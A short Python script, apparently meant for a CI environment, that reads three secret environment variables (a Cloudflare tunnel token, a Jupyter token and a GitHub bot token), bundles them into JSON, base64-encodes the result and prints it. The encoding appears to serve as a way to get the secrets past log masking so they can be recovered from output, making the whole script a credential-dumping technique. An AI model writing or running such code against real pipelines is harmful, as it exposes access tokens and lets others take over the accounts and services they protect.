import os
import json
import base64

json_data = {
    "CF_TUNNEL": os.environ.get('CF_TUNNEL', ''),
    "JUPYTER_TOKEN": os.environ.get('JUPYTER_TOKEN', ''),
    "GH_CICYBOT_TOKEN": os.environ.get('GH_CICYBOT_TOKEN', ''),
    "TEST": "TEST"
}
json_str = json.dumps(json_data)
base64_result = base64.b64encode(json_str.encode()).decode()
print(base64_result)
